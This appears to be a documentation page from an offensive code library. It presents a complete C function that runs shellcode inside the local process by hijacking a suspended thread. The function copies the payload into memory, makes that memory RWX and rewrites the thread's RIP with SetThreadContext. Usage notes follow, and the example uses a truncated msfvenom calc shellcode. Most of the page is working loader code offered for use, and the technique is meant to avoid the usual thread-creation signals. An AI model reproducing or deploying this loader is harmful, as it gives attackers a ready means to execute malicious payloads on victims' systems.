## Local Thread Hijacking via SetThreadContext

Hijacks a suspended thread in the local process to execute a payload without spawning a new thread pointed at the payload's address. Allocates a `RW` region, copies the payload in, flips protection to `RWX` with `VirtualProtect`, retrieves the target thread's `CONTEXT` structure with `GetThreadContext`, overwrites the instruction pointer register (`RIP` on x64) with the payload's base address, and applies the modified context back with `SetThreadContext`. When the caller resumes the thread with `ResumeThread`, execution transfers to the payload.

**Usage**

Call `RunViaClassicThreadHijacking` with a handle to a **suspended** thread, the payload buffer, and its size. After the function returns `TRUE`, resume the thread with `ResumeThread` to trigger payload execution. The target thread must be suspended before the call — pass `CREATE_SUSPENDED` to `CreateThread` or call `SuspendThread` beforehand. Do not target the process's main thread.

- `IN HANDLE hThread`  Handle to the suspended thread to hijack.
- `IN PBYTE pPayload`  Base address of the payload buffer to execute.
- `IN SIZE_T sPayloadSize`  Size of `pPayload` in bytes.

**Return Value**

`BOOL`  Returns `TRUE` if the thread context was successfully updated, otherwise `FALSE`. The caller must call `ResumeThread` after a `TRUE` return to trigger execution.

### Code

```c
#include <windows.h>
#include <string.h>
#include <stdio.h>


BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

    PVOID   pAddress        = NULL;
    DWORD   dwOldProtection = NULL;
    CONTEXT ThreadCtx       = {
        .ContextFlags = CONTEXT_CONTROL     // Required for GetThreadContext to populate RIP/EIP.
    };

    // Allocate RW memory to hold the payload before making it executable.
    pAddress = VirtualAlloc(
        NULL,                       // Let the OS choose the base address.
        sPayloadSize,               // Size of the allocation in bytes.
        MEM_COMMIT | MEM_RESERVE,   // Reserve and commit pages in one call.
        PAGE_READWRITE              // RW only at allocation time; execute is added later.
    );
    if (pAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Copy the payload into the allocated region.
    memcpy(pAddress, pPayload, sPayloadSize);

    // Flip the memory protection from RW to RWX so the payload can execute.
    if (!VirtualProtect(
        pAddress,               // Base address of the region to modify.
        sPayloadSize,           // Size of the region in bytes.
        PAGE_EXECUTE_READWRITE, // New protection: read, write, and execute.
        &dwOldProtection        // Receives the previous protection value.
    )) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Retrieve the suspended thread's context.
    // ContextFlags must be set to CONTEXT_CONTROL before calling GetThreadContext.
    if (!GetThreadContext(hThread, &ThreadCtx)) {
        printf("[!] GetThreadContext Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Overwrite the instruction pointer with the payload's base address.
    // When the thread resumes, execution will begin at the payload.
    ThreadCtx.Rip = (DWORD_PTR)pAddress;

    // Apply the modified context back to the suspended thread.
    if (!SetThreadContext(hThread, &ThreadCtx)) {
        printf("[!] SetThreadContext Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}
```

**Example**

```c
DWORD  dwThreadId = 0;
HANDLE hThread     = NULL;

// Create a worker thread suspended — never hijack the calling (main) thread.
hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DummyFunction, NULL, CREATE_SUSPENDED, &dwThreadId);

// msfvenom calc shellcode, abbreviated for the snippet.
unsigned char pPayload[]   = { 0xFC, 0x48, 0x83, 0xE4, 0xF0 /* ... */ };

// Repoint the suspended thread's RIP at the staged payload.
RunViaClassicThreadHijacking(hThread, pPayload, sPayloadSize);

// Resume triggers execution at the payload's base address.
ResumeThread(hThread);
WaitForSingleObject(hThread, INFINITE);
```
